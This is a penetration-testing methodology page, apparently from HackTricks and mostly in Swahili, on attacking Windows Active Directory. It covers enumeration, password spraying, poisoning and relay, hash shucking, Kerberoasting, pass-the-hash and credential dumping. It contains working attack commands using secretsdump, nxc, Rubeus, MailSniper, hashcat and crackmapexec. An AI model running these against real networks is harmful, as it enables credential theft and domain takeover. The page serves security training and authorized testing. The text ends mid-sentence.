# Active Directory Methodology

{{#include ../../banners/hacktricks-training.md}}

## Muhtasari wa Msingi

**Active Directory** ni teknolojia ya msingi inayowezesha **wasimamizi wa mtandao** kuunda na kusimamia kwa ufanisi **domain**, **watumiaji**, na **vitu** ndani ya mtandao. Imetengenezwa ili iweze kupanuka, ikiruhusu kupanga idadi kubwa ya watumiaji katika **vikundi** na **vikundi vidogo**, wakati ikidhibiti **haki za kufikia** katika viwango mbalimbali.

Muundo wa **Active Directory** una tabaka tatu kuu: **domains**, **trees**, na **forests**. **Domain** ni mkusanyiko wa vitu, kama vile **watumiaji** au **vifaa**, vinavyoshiriki hifadhidata moja. **Trees** ni makundi ya domain zilizounganishwa kwa muundo unaoshirikiwa, na **forest** inawakilisha mkusanyiko wa miti kadhaa, iliyounganishwa kupitia **trust relationships**, ikifanya tabaka la juu kabisa la muundo wa shirika. **Haki** na **mawasiliano** maalumu zinaweza kutengwa katika kila moja ya viwango hivi.

Mafundisho muhimu ndani ya **Active Directory** ni pamoja na:

1. **Directory** – Ina taarifa zote zinazohusu vitu vya Active Directory.
2. **Object** – Inamaanisha vitu ndani ya directory, ikijumuisha **watumiaji**, **vikundi**, au **shared folders**.
3. **Domain** – Inatumika kama kontena la vitu vya directory, na inawezekana domains nyingi kuwepo ndani ya **forest**, kila moja ikiwa na mkusanyiko wake wa vitu.
4. **Tree** – Kikundi cha domains ambazo zinashiriki domain mzazi mmoja.
5. **Forest** – Kilele cha muundo wa shirika katika Active Directory, kinachotengenezwa na miti kadhaa zikiwa na **trust relationships** kati yao.

**Active Directory Domain Services (AD DS)** inajumuisha huduma mbalimbali muhimu kwa usimamizi wa kati na mawasiliano ndani ya mtandao. Huduma hizi ni pamoja na:

1. **Domain Services** – Inakusanya data na kusimamia mwingiliano kati ya **watumiaji** na **domains**, ikiwa ni pamoja na **authentication** na uwezo wa **search**.
2. **Certificate Services** – Inasimamia uundaji, ugawaji, na usimamizi wa **digital certificates** zilizo salama.
3. **Lightweight Directory Services** – Inaunga mkono programu zilizo directory-enabled kupitia **LDAP protocol**.
4. **Directory Federation Services** – Inatoa uwezo wa **single-sign-on** kuthibitisha watumiaji kati ya programu nyingi za wavuti katika kikao kimoja.
5. **Rights Management** – Inasaidia kulinda kazi za hakimiliki kwa kudhibiti usambazaji wake usioidhinishwa na matumizi.
6. **DNS Service** – Muhimu kwa kutatua **domain names**.

Kwa maelezo ya kina angalia: [**TechTerms - Active Directory Definition**](https://techterms.com/definition/active_directory)

### **Kerberos Authentication**

Ili kujifunza jinsi ya **attack an AD** unahitaji kuelewa vyema mchakato wa **Kerberos authentication**.\
[**Read this page if you still don't know how it works.**](kerberos-authentication.md)

## Cheat Sheet

Unaweza kutembelea [https://wadcoms.github.io/](https://wadcoms.github.io) kupata muhtasari wa haraka wa amri ambazo unaweza kutekeleza ili kuenumerate/exploit AD.

> [!WARNING]
> Kerberos communication inahitaji jina kamili la kikoa (FQDN) kufanya vitendo. Ikiwa utajaribu kufikia mashine kwa anwani ya IP, **itaitumia NTLM na si kerberos**.

## Recon Active Directory (No creds/sessions)

Kama una ufikiaji wa mazingira ya AD lakini huna credentials/sessions unaweza:

- **Pentest the network:**
- Scan mtandao, gundua mashine na ports zilizo wazi na jaribu **exploit vulnerabilities** au **extract credentials** kutoka kwao (kwa mfano, [printers could be very interesting targets](ad-information-in-printers.md)).
- Kufanya enumeration ya DNS kunaweza kutoa taarifa kuhusu servers muhimu katika domain kama web, printers, shares, vpn, media, n.k.
- `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
- Angalia [**Pentesting Methodology**](../../generic-methodologies-and-resources/pentesting-methodology.md) kwa maelezo zaidi juu ya jinsi ya kufanya hili.
- **Angalia ufikiaji wa null na Guest kwenye huduma za smb** (hii haitafanya kazi kwenye toleo za kisasa za Windows):
- `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
- `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
- `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
- Mwongozo wa kina juu ya jinsi ya kuenumerate SMB server unaweza kupatikana hapa:


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Enumerate Ldap**
- `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
- Mwongozo wa kina juu ya jinsi ya kuenumerate LDAP unaweza kupatikana hapa (tangaza **uwiano maalum kwa anonymous access**):


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Poison the network**
- Kusanya credentials kwa **impersonating services with Responder** (../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
- Pata ufikiaji wa mwenyeji kwa **abusing the relay attack** (../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)
- Kusanya credentials kwa **exposing fake UPnP services with evil-S** (../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
- Choma majina ya watumiaji/majina kutoka kwa nyaraka za ndani, mitandao ya kijamii, huduma (hasa web) ndani ya mazingira ya domain na pia kutoka kwa yaliyopo kwa umma.
- Ikiwa unapata majina kamili ya wafanyakazi wa kampuni, unaweza kujaribu kanuni mbalimbali za AD **username conventions** ([**read this**](https://activedirectorypro.com/active-directory-user-naming-convention/)). Mienendo ya kawaida ni: _NameSurname_, _Name.Surname_, _NamSur_ (herufi 3 za kila mmoja), _Nam.Sur_, _NSurname_, _N.Surname_, _SurnameName_, _Surname.Name_, _SurnameN_, _Surname.N_, herufi 3 _random na namba 3 random_ (abc123).
- Zana:
- [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
- [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### User enumeration

- **Anonymous SMB/LDAP enum:** Angalia kurasa za [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) na [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md).
- **Kerbrute enum**: Wakati **username batili inapoulizwa** server itajibu kwa kutumia msimbo wa kosa wa **Kerberos** _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_, na kutuwezesha kubaini kuwa username haikuwa sahihi. **Usernames halali** zitatoa au TGT katika AS-REP au kosa _KRB5KDC_ERR_PREAUTH_REQUIRED_, kuonyesha kuwa mtumiaji anahitajika kufanya pre-authentication.
- **No Authentication against MS-NRPC**: Kutumia auth-level = 1 (No authentication) dhidi ya Kiolesura cha MS-NRPC (Netlogon) kwenye domain controllers. Mbinu inaita `DsrGetDcNameEx2` baada ya ku-bind kiolesura cha MS-NRPC ili kuangalia kama user au computer ipo bila credentials yoyote. Zana ya [NauthNRPC](https://github.com/sud0Ru/NauthNRPC) inatekeleza aina hii ya enumeration. Utafiti unaweza kupatikana [hapa](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```
- **OWA (Outlook Web Access) Server**

Ikiwa umepata moja ya seva hizi kwenye mtandao, unaweza pia kufanya **user enumeration against it**. Kwa mfano, unaweza kutumia zana [**MailSniper**](https://github.com/dafthack/MailSniper):
```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```
> [!WARNING]
> Unaweza kupata orodha za majina ya watumiaji katika [**this github repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names)  na hii ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)).
>
> Hata hivyo, unapaswa kuwa na **majina ya watu wanaofanya kazi katika kampuni** kutoka kwa hatua ya recon ambayo unapaswa kuwa umefanya kabla. Ukiwa na jina na jina la ukoo unaweza kutumia script [**namemash.py**](https://gist.github.com/superkojiman/11076951) kuzalisha usernames zinazoweza kuwa halali.

### Kujua jina la mtumiaji mmoja au kadhaa

Sawa, unajua tayari una jina la mtumiaji halali lakini hakuna nywila... Kisha jaribu:

- [**ASREPRoast**](asreproast.md): Ikiwa mtumiaji **hana** attribute _DONT_REQ_PREAUTH_ unaweza **kuomba AS_REP message** kwa mtumiaji huyo ambayo itakuwa na data iliyofichwa kwa derivation ya nywila ya mtumiaji.
- [**Password Spraying**](password-spraying.md): Tujaribu **nywila zinazotumika sana** kwa kila mtumiaji uliogunduliwa; labda mtumiaji fulani anatumia nywila mbaya (kumbuka sera ya nywila!).
- Kumbuka unaweza pia **spray OWA servers** ili kujaribu kupata ufikiaji wa server za barua pepe za watumiaji.


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

Huenda ukaweza **kupata** baadhi ya challenge **hashes** ambazo unaweza kuvunja au zinazotokana na **poisoning** ya baadhi ya protocols za **network**:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

Ikiwa umefanikiwa kuorodhesha Active Directory utaweza kuwa na **anwani zaidi za barua pepe na uelewa bora wa mtandao**. Huenda ukaweza kulazimisha NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) ili kupata ufikiaji wa mazingira ya AD.

### NetExec workspace-driven recon & relay posture checks

- Tumia **`nxcdb` workspaces** kuhifadhi hali ya recon ya AD kwa kila engagement: `workspace create <name>` inazalisha per-protocol SQLite DBs chini ya `~/.nxc/workspaces/<name>` (smb/mssql/winrm/ldap/etc). Badilisha maoni kwa `proto smb|mssql|winrm` na orodhesha siri zilizokusanywa kwa `creds`. Futa kwa mkono data nyeti wakati umemaliza: `rm -rf ~/.nxc/workspaces/<name>`.
- Ugunduzi wa subnet kwa haraka kwa **`netexec smb <cidr>`** unaonyesha **domain**, **OS build**, **SMB signing requirements**, na **Null Auth**. Hosts zinazoonyesha `(signing:False)` ni **relay-prone**, wakati DCs mara nyingi zinahitaji signing.
- Tengeneza **hostnames in /etc/hosts** moja kwa moja kutoka kwa output ya NetExec ili kurahisisha kulenga:
```bash
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```
- Wakati **SMB relay to the DC is blocked** kwa signing, bado chunguza msimamo wa **LDAP**: `netexec ldap <dc>` inaonyesha `(signing:None)` / weak channel binding. DC ambayo inahitaji SMB signing lakini LDAP signing imezimwa bado inaweza kuwa lengo linalofaa la **relay-to-LDAP** kwa matumizi mabaya kama **SPN-less RBCD**.

### Client-side printer credential leaks → uthibitishaji kwa wingi wa credential za domain

- UI za printer/web mara nyingine hujumuisha nywila za admin zilizofichwa ndani ya HTML. Kuangalia source/devtools kunaweza kufichua maandishi wazi (mfano, `<input value="<password>">`), na kuruhusu upatikanaji wa Basic-auth kwa repositories za scan/print.
- Kazi za uchapishaji zilizoletwa zinaweza kuwa na **plaintext onboarding docs** zenye nywila za kila mtumiaji. Weka pairings zikilingana wakati wa kujaribu:
```bash
cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
```
### Steal NTLM Creds

If you can **access other PCs or shares** with the **null or guest user** you could **place files** (like a SCF file) that if somehow accessed will t**rigger an NTLM authentication against you** so you can **steal** the **NTLM challenge** to crack it:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

**Hash shucking** treats every NT hash you already possess as a candidate password for other, slower formats whose key material is derived directly from the NT hash. Instead of brute-forcing long passphrases in Kerberos RC4 tickets, NetNTLM challenges, or cached credentials, you feed the NT hashes into Hashcat’s NT-candidate modes and let it validate password reuse without ever learning the plaintext. This is especially potent after a domain compromise where you can harvest thousands of current and historical NT hashes.

Use shucking when:

- You have an NT corpus from DCSync, SAM/SECURITY dumps, or credential vaults and need to test for reuse in other domains/forests.
- You capture RC4-based Kerberos material (`$krb5tgs$23$`, `$krb5asrep$23$`), NetNTLM responses, or DCC/DCC2 blobs.
- You want to quickly prove reuse for long, uncrackable passphrases and immediately pivot via Pass-the-Hash.

The technique **does not work** against encryption types whose keys are not the NT hash (e.g., Kerberos etype 17/18 AES). If a domain enforces AES-only, you must revert to the regular password modes.

#### Building an NT hash corpus

- **DCSync/NTDS** – Use `secretsdump.py` with history to grab the largest possible set of NT hashes (and their previous values):

```bash
secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
```

History entries dramatically widen the candidate pool because Microsoft can store up to 24 previous hashes per account. For more ways to harvest NTDS secrets see:

{{#ref}}
dcsync.md
{{#endref}}

- **Endpoint cache dumps** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (or Mimikatz `lsadump::sam /patch`) extracts local SAM/SECURITY data and cached domain logons (DCC/DCC2). Deduplicate and append those hashes to the same `nt_candidates.txt` list.
- **Track metadata** – Keep the username/domain that produced each hash (even if the wordlist contains only hex). Matching hashes tell you immediately which principal is reusing a password once Hashcat prints the winning candidate.
- Prefer candidates from the same forest or a trusted forest; that maximizes the chance of overlap when shucking.

#### Hashcat NT-candidate modes

| Hash Type                                | Password Mode | NT-Candidate Mode |
| ---------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

Notes:

- NT-candidate inputs **must remain raw 32-hex NT hashes**. Disable rule engines (no `-r`, no hybrid modes) because mangling corrupts the candidate key material.
- These modes are not inherently faster, but the NTLM keyspace (~30,000 MH/s on an M3 Max) is ~100× quicker than Kerberos RC4 (~300 MH/s). Testing a curated NT list is far cheaper than exploring the entire password space in the slow format.
- Always run the **latest Hashcat build** (`git clone https://github.com/hashcat/hashcat && make install`) because modes 31500/31600/35300/35400 shipped recently.
- There is currently no NT mode for AS-REQ Pre-Auth, and AES etypes (19600/19700) require the plaintext password because their keys are derived via PBKDF2 from UTF-16LE passwords, not raw NT hashes.

#### Example – Kerberoast RC4 (mode 35300)

1. Capture an RC4 TGS for a target SPN with a low-privileged user (see the Kerberoast page for details):

{{#ref}}
kerberoast.md
{{#endref}}

```bash
GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
```

2. Shuck the ticket with your NT list:

```bash
hashcat -m 35300 roastable_TGS nt_candidates.txt
```

Hashcat derives the RC4 key from each NT candidate and validates the `$krb5tgs$23$...` blob. A match confirms that the service account uses one of your existing NT hashes.

3. Immediately pivot via PtH:

```bash
nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
```

You can optionally recover the plaintext later with `hashcat -m 1000 <matched_hash> wordlists/` if needed.

#### Example – Cached credentials (mode 31600)

1. Dump cached logons from a compromised workstation:

```bash
nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
```

2. Copy the DCC2 line for the interesting domain user into `dcc2_highpriv.txt` and shuck it:

```bash
hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
```

3. A successful match yields the NT hash already known in your list, proving that the cached user is reusing a password. Use it directly for PtH (`nxc smb <dc_ip> -u highpriv -H <hash>`) or brute-force it in fast NTLM mode to recover the string.

The exact same workflow applies to NetNTLM challenge-responses (`-m 27000/27100`) and DCC (`-m 31500`). Once a match is identified you can launch relay, SMB/WMI/WinRM PtH, or re-crack the NT hash with masks/rules offline.



## Enumerating Active Directory WITH credentials/session

For this phase you need to have **compromised the credentials or a session of a valid domain account.** If you have some valid credentials or a shell as a domain user, **you should remember that the options given before are still options to compromise other users**.

Before start the authenticated enumeration you should know what is the **Kerberos double hop problem.**


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumeration

Having compromised an account is a **big step to start compromising the whole domain**, because you are going to be able to start the **Active Directory Enumeration:**

Regarding [**ASREPRoast**](asreproast.md) you can now find every possible vulnerable user, and regarding [**Password Spraying**](password-spraying.md) you can get a **list of all the usernames** and try the password of the compromised account, empty passwords and new promising passwords.

- You could use the [**CMD to perform a basic recon**](../basic-cmd-for-pentesters.md#domain-info)
- You can also use [**powershell for recon**](../basic-powershell-for-pentesters/index.html) which will be stealthier
- You can also [**use powerview**](../basic-powershell-for-pentesters/powerview.md) to extract more detailed information
- Another amazing tool for recon in an active directory is [**BloodHound**](bloodhound.md). It is **not very stealthy** (depending on the collection methods you use), but **if you don't care** about that, you should totally give it a try. Find where users can RDP, find path to other groups, etc.
- **Other automated AD enumeration tools are:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- [**DNS records of the AD**](ad-dns-records.md) as they might contain interesting information.
- A **tool with GUI** that you can use to enumerate the directory is **AdExplorer.exe** from **SysInternal** Suite.
- You can also search in the LDAP database with **ldapsearch** to look for credentials in fields _userPassword_ & _unixUserPassword_, or even for _Description_. cf. [Password in AD User comment on PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment) for other methods.
- If you are using **Linux**, you could also enumerate the domain using [**pywerview**](https://github.com/the-useless-one/pywerview).
- You could also try automated tools as:
- [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
- [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Extracting all domain users**

It's very easy to obtain all the domain usernames from Windows (`net user /domain` ,`Get-DomainUser` or `wmic useraccount get name,sid`). In Linux, you can use: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` or `enum4linux -a -u "user" -p "password" <DC IP>`

> Even if this Enumeration section looks small this is the most important part of all. Access the links (mainly the one of cmd, powershell, powerview and BloodHound), learn how to enumerate a domain and practice until you feel comfortable. During an assessment, this will be the key moment to find your way to DA or to decide that nothing can be done.

### Kerberoast

Kerberoasting involves obtaining **TGS tickets** used by services tied to user accounts and cracking their encryption—which is based on user passwords—**offline**.

More about this in:


{{#ref}}
kerberoast.md
{{#endref}}

### Remote connexion (RDP, SSH, FTP, Win-RM, etc)

Once you have obtained some credentials you could check if you have access to any **machine**. For that matter, you could use **CrackMapExec** to attempt connecting on several servers with different protocols, accordingly to your ports scans.

### Local Privilege Escalation

If you have compromised credentials or a session as a regular domain user and you have **access** with this user to **any machine in the domain** you should try to find your way to **escalate privileges locally and looting for credentials**. This is because only with local administrator privileges you will be able to **dump hashes of other users** in memory (LSASS) and locally (SAM).

There is a complete page in this book about [**local privilege escalation in Windows**](../windows-local-privilege-escalation/index.html) and a [**checklist**](../checklist-windows-privilege-escalation.md). Also, don't forget to use [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite).

### Current Session Tickets

It's very **unlikely** that you will find **tickets** in the current user **giving you permission to access** unexpected resources, but you could check:
```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```
### NTLM Relay

Ikiwa umefanikiwa kuorodhesha Active Directory utakuwa na **barua pepe zaidi na uelewa bora wa mtandao**. Unaweza kuwa na uwezo wa kulazimisha NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)**.**

### Inatafuta Creds katika Computer Shares | SMB Shares

Sasa baada ya kuwa na kredenshiali za msingi unapaswa kuangalia kama unaweza **kupata** faili zozote za **kuvutia zinazoshirikiwa ndani ya AD**. Unaweza kufanya hivyo kwa mkono lakini ni kazi ya kurudia sana (na zaidi ikiwa utapata mamia ya nyaraka unazohitaji kukagua).

[**Follow this link to learn about tools you could use.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Steal NTLM Creds

Ikiwa unaweza **kupata ufikivu kwenye PC nyingine au shares**, unaweza **kuweka faili** (kama faili ya SCF) ambazo zikigusiwa zitafanya **NTLM authentication dhidi yako**, hivyo uweze **kuiba** **NTLM challenge** ili kui-crack:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

Udhaifu huu ulimruhusu mtumiaji yeyote aliyethibitishwa kuweza **compromise the domain controller**.


{{#ref}}
printnightmare.md
{{#endref}}

## Privilege escalation on Active Directory WITH privileged credentials/session

**Kwa mbinu zinazofuata mtumiaji wa kawaida wa domain haitoshi, unahitaji baadhi ya privileges/credentials maalum ili kufanya mashambulio haya.**

### Hash extraction

Kwa bahati nzuri umefanikiwa **compromise akaunti ya local admin** kwa kutumia [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) including relaying, [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md), [escalating privileges locally](../windows-local-privilege-escalation/index.html).\
Kisha, ni wakati wa ku-dump hash zote katika memory na kwa local.\
[**Read this page about different ways to obtain the hashes.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**Mara tu unapokuwa na hash ya mtumiaji**, unaweza kuitumia kumfananisha.\
Unahitaji kutumia zana itakayofanya **NTLM authentication** ikitumia hash hiyo, **au** unaweza kuunda sessionlogon mpya na ku-inject hash hiyo ndani ya **LSASS**, hivyo wakati yoyote **NTLM authentication** itakapofanywa, hash hiyo itatumika. Chaguo la mwisho ndilo mimikatz inalofanya.\
[**Read this page for more information.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

Shambulio hili linalenga kutumia user **NTLM hash** kuomba **Kerberos tickets**, kama mbadala wa kawaida **Pass The Hash** juu ya NTLM protocol. Kwa hiyo, hili linaweza kuwa muhimu hasa kwenye mitandao ambapo NTLM protocol imezimwa na Kerberos pekee ndio inaruhusiwa kama protocol ya uthibitisho.


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

Katika njia ya shambulio ya **Pass The Ticket (PTT)**, washambuliaji huiba tiketi ya uthibitisho ya mtumiaji badala ya nenosiri au thamani za hash. Tiketi hii iliyoibwa kisha inatumika kuiga mtumiaji, kupata upatikanaji usioidhinishwa kwa rasilimali na huduma ndani ya mtandao.


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Credentials Reuse

Ikiwa una **hash** au **password** ya **local administrator** unapaswa kujaribu **ku-login lokali** kwenye PC nyingine ukitumia hizo.
```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
> [!WARNING]
> Kumbuka kwamba hili ni **linalotoa kelele nyingi** na **LAPS** lingepunguza hilo.

### MSSQL Abuse & Trusted Links

Ikiwa mtumiaji ana ruhusa za kufikia **MSSQL instances**, anaweza kuitumia ili **kutekeleza amri** kwenye mwenyeji wa MSSQL (ikiwa inaendesha kama SA), **kuiba** NetNTLM **hash** au hata kufanya **relay attack**.\
Pia, ikiwa mfano wa MSSQL umeaminika (database link) na mfano tofauti wa MSSQL. Ikiwa mtumiaji ana ruhusa juu ya database iliyothibitishwa, ataweza **kutumia uhusiano wa kuaminiana kutekeleza queries pia katika mfano mwingine**. Uaminifu huu unaweza kuunganishwa mfululizo na kwa wakati fulani mtumiaji anaweza kupata database isiyosahihi iliyowekwa ili aweze kutekeleza amri.\
**Viungo kati ya databases vinafanya kazi hata kati ya forest trusts.**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### IT asset/deployment platforms abuse

Suites za wahusika wa tatu za inventory na deployment mara nyingi hutoa njia zenye nguvu kuelekea credentials na code execution. Tazama:

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

Ikiwa utapata Computer object yoyote yenye attribute [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) na una ruhusa za domain kwenye kompyuta hiyo, utaweza kuchoma TGTs kutoka kwenye kumbukumbu za watumiaji wote wanaoingia kwenye kompyuta.\
Hivyo, ikiwa **Domain Admin anaingia kwenye kompyuta**, utaweza kuchoma TGT yake na kumfanyia kuiga kwa kutumia [Pass the Ticket](pass-the-ticket.md).\
Kutokana na constrained delegation unaweza hata **kuvizia/kuharibu moja kwa moja Print Server** (kwa bahati inaweza kuwa DC).


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

Ikiwa mtumiaji au kompyuta ameruhusiwa kwa "Constrained Delegation" itakuwa na uwezo wa **kuiga mtumiaji yeyote ili kufikia huduma kadhaa kwenye kompyuta**.\
Kisha, ikiwa utapata **compromise the hash** ya mtumiaji/kompyuta hii utaweza **kuiga mtumiaji yeyote** (hata domain admins) kupata huduma fulani.


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

Kuwa na ruhusa ya **WRITE** kwenye Active Directory object ya kompyuta ya mbali kunawawezesha kupata code execution kwa **haki zilizo juu**:


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Permissions/ACLs Abuse

Mtumiaji aliyepatikana anaweza kuwa na baadhi ya **haki za kuvutia juu ya vitu vya domain** ambazo zinaweza kukuruhusu **kuhamia upande mwingine / kupandisha cheo** baadaye.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Printer Spooler service abuse

Kugundua **Spool service listening** ndani ya domain kunaweza kutumika ku**pata credentials mpya** na **kupandisha hadhi**.


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Third party sessions abuse

Ikiwa **watumiaji wengine** wanakuwepo na **wanafikia** mashine iliyopatikana, inawezekana **kukusanya credentials kutoka kwenye kumbukumbu** na hata **kuingiza beacons katika michakato yao** ili kuiga watumiaji hao.\
Kwa kawaida watumiaji watafikia mfumo kupitia RDP, hivyo hapa kuna jinsi ya kufanya mashambulizi machache juu ya RDP sessions za wahusika wengine:


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS** inatoa mfumo wa kusimamia **local Administrator password** kwenye kompyuta zilizounganishwa na domain, ikihakikisha kuwa nywila ni **randomized**, unique, na inabadilishwa mara kwa mara. Nywila hizi zinahifadhiwa katika Active Directory na upatikanaji unadhibitiwa kupitia ACLs kwa watumiaji walioidhinishwa tu. Kwa ruhusa za kutosha za kupata nywila hizi, inawezekana ku-pivot kwenda kwenye kompyuta nyingine.


{{#ref}}
laps.md
{{#endref}}

### Certificate Theft

**Kukusanya certificates** kutoka kwenye mashine iliyopatikana kunaweza kuwa njia ya kupandisha hadhi ndani ya mazingira:


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Certificate Templates Abuse

Ikiwa **templates zilizo hatarini** zimewekwa inaweza kuwezekana kuzitumia ku**pandisha hadhi**:


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Post-exploitation with high privilege account

### Dumping Domain Credentials

Mara utakapo pata **Domain Admin** au bora zaidi **Enterprise Admin** ruhusa, unaweza **kuchoma** **domain database**: _ntds.dit_.

[**More information about DCSync attack can be found here**](dcsync.md).

[**More information about how to steal the NTDS.dit can be found here**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Privesc as Persistence

Baadhi ya mbinu zilizounganishwa hapo juu zinaweza kutumika kwa persistence.\
Kwa mfano unaweza:

